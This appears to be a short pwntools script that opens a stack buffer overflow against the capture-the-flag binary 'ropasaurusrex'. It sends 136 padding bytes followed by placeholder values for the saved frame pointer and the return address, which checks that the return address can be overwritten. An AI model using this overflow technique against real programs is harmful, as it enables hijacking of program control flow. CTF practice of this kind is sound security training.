#!/usr/bin/env python

from pwn import *

DUMMY_BYTE="A"*136
SAVED_EBP="BBBB"

RET_ADDR="CCCC"

p = process('./ropasaurusrex')

a=raw_input('#')

p.send(DUMMY_BYTE + SAVED_EBP + RET_ADDR)

b=raw_input('#')
